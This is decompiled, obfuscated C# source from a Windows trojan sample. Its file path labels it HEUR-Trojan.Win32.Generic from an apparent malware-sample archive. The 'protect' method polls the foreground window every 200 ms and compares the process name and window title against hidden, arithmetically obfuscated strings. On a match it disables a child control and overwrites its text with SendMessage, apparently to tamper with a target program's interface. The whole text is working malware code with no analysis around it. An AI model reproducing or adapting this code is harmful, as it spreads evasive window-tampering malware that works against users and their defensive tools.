// Decompiled with JetBrains decompiler
// Type: w.mgr
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17B3991E-7989-4932-9D30-8C031294ADFF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-797e4fb918a10e74cd484f57ffc9963a5d57e1b534dbfd72a11b844568de85d2.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace w
{
  public class mgr
  {
    private List<IntPtr> a;
    public static object b;
    public static byte[] c;
    public static byte[] d;

    public mgr() => this.a = new List<IntPtr>();

    [DllImport("user32.dll", EntryPoint = "EnableWindow")]
    private static extern bool a([In] IntPtr obj0, [In] bool obj1);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int b([In] IntPtr obj0, [In] ref int obj1);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr c();

    [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int d([In] int obj0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, [In] int obj2);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int e([In] int obj0, [In] int obj1, [In] int obj2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowText", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int f([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int g([In] int obj0);

    [DllImport("user32", EntryPoint = "EnumChildWindows", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int h([In] IntPtr obj0, [In] mgr.a obj1, [In] ref IntPtr obj2);

    private bool i([In] int obj0, [In] int obj1)
    {
      this.a.Add((IntPtr) obj0);
      return true;
    }

    public void protect()
    {
      while (true)
      {
        Thread.Sleep(200);
        IntPtr num1 = mgr.c();
        int num2 = num1.ToInt32() == 0 ? 1 : 0;
        IntPtr num3;
        \u003CModule\u003E.e = (object) num3;
        if (num2 == 0)
        {
          int processId = 0;
          mgr.b(num1, ref processId);
          if (processId > 0)
          {
            int num4 = (75 * processId + processId * 53 & processId) - 2250 != -6565 ? sizeof (long) + 35760 : Type.EmptyTypes.Length - 992103302;
            int num5 = processId << 8 != -4940 ? Type.EmptyTypes.Length + 43916 : Type.EmptyTypes.Length + 1164634875;
            int m = \u003CModule\u003E.m;
            int num6 = (3927 ^ (m & -7703) * (4 * m + m * 12)) == 0 ? Type.EmptyTypes.Length + 1307985726 : sizeof (short) + 250;
            \u003CModule\u003E.c(num4, num5, num6);
            int num7 = mgr.g((int) num1);
            string str1;
            int num8;
            if (num7 == 0)
            {
              str1 = \u003CModule\u003E.c(-(1879048192 * processId) == -812169384 ? Type.EmptyTypes.Length - 1367818249 : Type.EmptyTypes.Length + 4586, Type.EmptyTypes.Length + 12707, Type.EmptyTypes.Length + 22);
            }
            else
            {
              StringBuilder stringBuilder = new StringBuilder(checked (num7 + 1));
              num8 = mgr.f((int) num1, stringBuilder, stringBuilder.Capacity);
              str1 = num8 != 0 ? stringBuilder.ToString() : \u003CModule\u003E.c(sizeof (double) + 23624, checked (1021729956 - 1021698170), Type.EmptyTypes.Length + 210);
            }
            Process processById = Process.GetProcessById(processId);
            int num9 = Operators.CompareString(processById.ProcessName.ToLower(), \u003CModule\u003E.c((-8612 ^ (int) ((uint) m % 1988559458U)) != 0 ? Type.EmptyTypes.Length + 58096 : checked (974102318 - 1307759607), Type.EmptyTypes.Length + 49955, Type.EmptyTypes.Length + 48), false) == 0 | Operators.CompareString(processById.ProcessName.ToLower(), \u003CModule\u003E.c(sizeof (int) + 60508, Type.EmptyTypes.Length + 52048, (9650 ^ m * 79 + 177 * m - 1018487670) == 0 ? Type.EmptyTypes.Length - 1508128609 : 190), false) == 0 ? 1 : 0;
            string lower = processById.ProcessName.ToLower();
            int n = \u003CModule\u003E.n;
            string Right = \u003CModule\u003E.c(((int) ((uint) n / 1078U >> 1) & 1073741824) != (1073741824 & (int) ((uint) n / 1759U)) ? Type.EmptyTypes.Length - 268842368 : Type.EmptyTypes.Length + 55686, (int) (IntPtr) (-1709532559 ^ -1709467118), Type.EmptyTypes.Length + 192);
            int num10 = Operators.CompareString(lower, Right, false) == 0 ? 1 : 0;
            int num11 = num9 | num10;
            int num12 = Operators.CompareString(str1.ToLower(), \u003CModule\u003E.c(sizeof (float) + 48711, Type.EmptyTypes.Length + 58817, checked (493242882 - 493242840)), false);
            \u003CModule\u003E.j = -1652138191;
            int num13 = num12 == 0 ? 1 : 0;
            if ((num11 | num13) != 0)
            {
              List<IntPtr> numList = new List<IntPtr>();
              int num14 = 0;
              IntPtr[] numArray = this.j(num1);
              int index = 0;
              while (index < numArray.Length)
              {
                num3 = numArray[index];
                string str2 = Strings.Space(200);
                int startIndex = mgr.d((int) num3, ref str2, 200);
                string str3 = str2.Remove(startIndex, checked (200 - startIndex));
                if (Operators.CompareString(str3.ToLower(), \u003CModule\u003E.c(962, Type.EmptyTypes.Length + 9313, (562 & (processId & 1831154688) - 9943) == 32 ? Type.EmptyTypes.Length + 112 : Type.EmptyTypes.Length + 1939681639), false) == 0)
                  numList.Add(num3);
                bool flag = Operators.CompareString(str3.ToLower(), \u003CModule\u003E.c(Type.EmptyTypes.Length + 56981, checked (345904189 - 345853228), ((int) ((uint) n >> 9) | -2122317825) != -2122317825 ? (((int) ((uint) n / 134217728U) ^ -3673) != 0 ? ((num8 & 5430 | -66) != -66 ? Type.EmptyTypes.Length + 1594963652 : Type.EmptyTypes.Length - 1273521040) : sizeof (long) + 2038411162) : ((3 * startIndex + startIndex & startIndex & 2) != ((int) ((uint) -(startIndex << 7) >> 2) & 2) ? (((7869 | 134217728 * num8 | num8) & -4862) != 0 ? Type.EmptyTypes.Length - 1504675780 : Type.EmptyTypes.Length - 1113084292) : Type.EmptyTypes.Length + 156)), false) == 0 | Operators.CompareString(str3.ToLower(), \u003CModule\u003E.c(14 * n + 6906 + n * 50 == 6349 ? 1895202681 + 62141060 : Type.EmptyTypes.Length + 26525, 25954597 ^ 25970437, Type.EmptyTypes.Length + 14), false) == 0;
                \u003CModule\u003E.c = (object) num8;
                if (flag)
                  checked { ++num14; }
                checked { ++index; }
              }
              if (numList.Count == 2 & (num14 == 2 | num14 == 1))
              {
                mgr.a(numList[0], false);
                int num15 = (int) numList[0];
                string str4 = \u003CModule\u003E.c(sizeof (byte) + 67893, Type.EmptyTypes.Length + 77852, 222);
                ref string local = ref str4;
                mgr.e(num15, 12, 0, ref local);
              }
            }
          }
        }
      }
    }

    private IntPtr[] j([In] IntPtr obj0)
    {
      lock (this)
      {
        this.a.Clear();
        IntPtr num1 = obj0;
        mgr.a a = new mgr.a(this.i);
        IntPtr num2 = (IntPtr) 0;
        ref IntPtr local = ref num2;
        mgr.h(num1, a, ref local);
        return this.a.ToArray();
      }
    }

    private delegate bool a([In] int obj0, [In] int obj1);

    private delegate bool b([In] int obj0, [In] int obj1);
  }
}
